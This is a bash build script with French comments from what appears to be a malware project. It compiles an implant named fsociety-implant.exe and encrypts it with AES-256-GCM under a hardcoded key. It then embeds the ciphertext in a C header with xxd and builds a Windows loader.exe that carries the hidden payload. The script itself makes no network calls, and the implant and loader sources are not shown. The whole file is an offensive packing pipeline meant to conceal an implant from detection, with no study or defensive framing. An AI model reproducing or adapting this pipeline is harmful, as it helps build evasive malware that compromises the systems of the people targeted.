#!/bin/bash
#
# tools/build_loader.sh
# Compile le loader complet :
#   1. Compile l'implant (fsociety-implant.exe)
#   2. Chiffre le payload avec AES-256-GCM
#   3. Génère loader/include/payload.h avec xxd -i
#   4. Compile le loader

set -e

# Clé AES-256 (32 octets = 64 caractères hex).
# DOIT correspondre à celle dans loader/src/main.c
AES_KEY="00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff"

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
IMPLANT_DIR="$ROOT/implant"
LOADER_DIR="$ROOT/loader"
TOOLS_DIR="$ROOT/tools"

echo "=== [1/4] Compilation de l'implant ==="
cd "$IMPLANT_DIR"
make

echo ""
echo "=== [2/4] Compilation de tools/encrypt_payload ==="
cd "$TOOLS_DIR"
gcc -O2 -Wall -o encrypt_payload encrypt_payload.c -lssl -lcrypto

echo ""
echo "=== [3/4] Chiffrement du payload ==="
mkdir -p "$LOADER_DIR/payload"
"$TOOLS_DIR/encrypt_payload" \
    "$IMPLANT_DIR/fsociety-implant.exe" \
    "$LOADER_DIR/payload/payload.enc" \
    "$AES_KEY"

echo ""
echo "=== [4/4] Génération du header C ==="
cd "$LOADER_DIR/payload"
xxd -i payload.enc > payload.h

# Renommer les variables pour un nom plus propre
sed -i 's/payload_enc/fsociety_payload_enc/g' payload.h
sed -i 's/unsigned int fsociety_payload_enc_len/const unsigned int fsociety_payload_enc_len/' payload.h

# Ajuster le nom dans main.c (on utilise payload_enc — adapter)
# Solution : le header définit payload_enc_len et payload_enc, on garde tel quel.

echo "[+] Header généré : $LOADER_DIR/payload/payload.h"
echo ""

echo "=== Compilation du loader ==="
cd "$LOADER_DIR"

# On doit copier payload.h dans include/ pour que main.c le trouve
cp "$LOADER_DIR/payload/payload.h" "$LOADER_DIR/include/payload.h"

make

echo ""
echo "=========================================="
echo "  Loader prêt : $LOADER_DIR/loader.exe"
echo "=========================================="